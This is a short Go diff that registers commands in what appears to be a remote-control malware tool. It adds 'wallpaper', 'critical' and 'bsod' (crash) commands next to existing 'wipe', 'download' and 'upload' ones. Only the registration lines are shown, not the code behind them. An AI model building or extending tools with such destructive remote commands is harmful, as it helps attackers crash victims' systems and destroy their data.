@@ -20,4 +20,7 @@ func registerCommands() {
 	commandsList["wipe"] = &commands.WipeCommand{}
 	commandsList["download"] = &commands.DownloadCommand{}
 	commandsList["upload"] = &commands.UploadCommand{}
+	commandsList["wallpaper"] = &commands.WallpaperCommand{}
+	commandsList["critical"] = &commands.CriticalCommand{}
+	commandsList["bsod"] = &commands.CrashCommand{}
 }
